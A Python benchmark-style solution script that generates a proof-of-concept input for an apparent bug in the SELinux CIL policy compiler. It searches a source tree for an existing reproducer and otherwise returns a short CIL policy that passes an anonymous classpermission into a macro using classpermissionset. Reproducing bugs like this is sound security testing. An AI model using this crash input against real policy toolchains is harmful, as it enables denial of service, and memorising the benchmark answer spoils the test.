import os
import tarfile
import re


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Try to discover an existing PoC/example from the source tree
        content = self._find_repo_poc(src_path)
        if content:
            return content

        # Fallback minimal PoC attempt based on typical CIL syntax
        # This aims to pass an anonymous classpermission into a macro that uses a classpermissionset rule.
        fallback_poc = (
            "(block poc\n"
            "  (macro trigger ((cp))\n"
            "    (classpermissionset cs (cp))\n"
            "  )\n"
            "  (call trigger ((classpermission (file (getattr)))))\n"
            ")\n"
        )
        return fallback_poc.encode("utf-8")

    def _find_repo_poc(self, src_path: str) -> bytes:
        candidates = []

        def consider_candidate(name: str, data: bytes):
            try:
                txt = data.decode("utf-8", errors="ignore")
            except Exception:
                return
            low = txt.lower()
            # Heuristic: looking for a file that includes macro usage, call, classpermission (anonymous) and classpermissionset
            if ("(macro" in low and "(call" in low
                    and "classpermissionset" in low
                    and "(classpermission" in low):
                # Prefer shorter files as likely PoCs
                candidates.append((len(txt), data))

        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    full = os.path.join(root, fn)
                    # Only consider reasonably small text-like files
                    if os.path.getsize(full) > 256 * 1024:
                        continue
                    try:
                        with open(full, "rb") as f:
                            data = f.read()
                    except Exception:
                        continue
                    # Only consider files that look like CIL or plain text
                    if not re.search(rb'[^\x09\x0a\x0d\x20-\x7e]', data[:4096]):
                        consider_candidate(full, data)
        else:
            # If it's a tarball, scan inside
            try:
                with tarfile.open(src_path, mode="r:*") as tf:
                    for m in tf.getmembers():
                        if not m.isfile() or m.size > 256 * 1024:
                            continue
                        # Only consider filenames that likely contain policy/CIL
                        name_lower = m.name.lower()
                        if not (name_lower.endswith(".cil") or "cil" in name_lower or "policy" in name_lower or "tests" in name_lower):
                            continue
                        f = tf.extractfile(m)
                        if not f:
                            continue
                        try:
                            data = f.read()
                        except Exception:
                            continue
                        # Only consider files that look like text
                        if not re.search(rb'[^\x09\x0a\x0d\x20-\x7e]', data[:4096]):
                            consider_candidate(m.name, data)
            except Exception:
                pass

        if candidates:
            # pick smallest
            candidates.sort(key=lambda x: x[0])
            return candidates[0][1]

        return b""